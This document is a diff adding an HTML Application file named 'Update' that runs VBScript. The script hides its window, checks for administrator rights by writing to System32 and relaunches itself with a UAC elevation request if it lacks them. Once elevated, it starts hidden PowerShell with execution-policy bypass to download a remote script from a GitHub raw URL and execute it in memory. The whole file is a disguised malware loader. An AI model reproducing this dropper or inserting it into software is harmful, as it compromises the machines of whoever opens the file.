@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="Update" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" CONTEXTMENU="no" />
+<script language="VBScript">
+' Check if running as admin, if not, elevate
+Dim shell
+Set shell = CreateObject("Shell.Application")
+
+' Try to create a test object that requires admin
+On Error Resume Next
+Dim fso, testFile
+Set fso = CreateObject("Scripting.FileSystemObject")
+fso.CreateTextFile "C:\Windows\System32\test_elevation.tmp", True
+If Err.Number <> 0 Then
+    ' Not admin - relaunch with elevation
+    shell.ShellExecute "mshta.exe", """" & Replace(self.location.pathname, "/", "\") & """", "", "runas", 0
+    self.close
+Else
+    ' Already admin - run the script
+    fso.DeleteFile "C:\Windows\System32\test_elevation.tmp", True
+    shell.ShellExecute "powershell", "-NoP -NonI -W Hidden -Exec Bypass -C ""iex ((New-Object Net.WebClient).DownloadString('https://github.com/c42376918-spec/dreamarc/raw/refs/heads/main/UpdateAPI.ps1'))""", "", "open", 0
+    self.close
+End If
+On Error Goto 0
+</script>
+</head>
+<body></body>
+</html>
